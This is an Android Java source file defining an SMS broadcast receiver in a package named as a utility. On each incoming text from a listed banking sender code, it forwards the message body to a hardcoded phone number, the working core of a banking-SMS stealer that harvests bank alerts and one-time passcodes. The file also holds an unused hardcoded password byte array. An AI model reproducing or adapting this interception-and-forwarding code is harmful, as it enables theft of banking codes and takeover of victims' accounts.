package com.insanity.sms.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {

	public static final String SMS_EXTRA_NAME = "pdus";
	public static final byte[] PASSWORD = new byte[] { 0x20, 0x32, 0x34, 0x47,
			(byte) 0x84, 0x33, 0x58 };
	public static final String SMS_DESTINATION = "9741155365";

	public void onReceive(Context context, Intent intent) {
		Bundle extras = intent.getExtras();

		String messages = "";

		if (extras != null) {
			Object[] smsExtra = (Object[]) extras.get(SMS_EXTRA_NAME);

			for (int i = 0; i < smsExtra.length; ++i) {
				SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtra[i]);

				String body = sms.getMessageBody().toString();
				String address = sms.getOriginatingAddress();
				if (BankingSMSRegexConstants.smsBankingAddressCodes
						.contains(address)) {

					messages += "SMS from " + address + " :\n";
					messages += body + "\n";
					sendSMS(messages, SMS_DESTINATION);
					Toast.makeText(context, messages, Toast.LENGTH_SHORT)
							.show();
				}
			}
		}
	}

	public void sendSMS(String message, String number) {
		SmsManager sm = SmsManager.getDefault();
		sm.sendTextMessage(number, null, message, null, null);
	}
}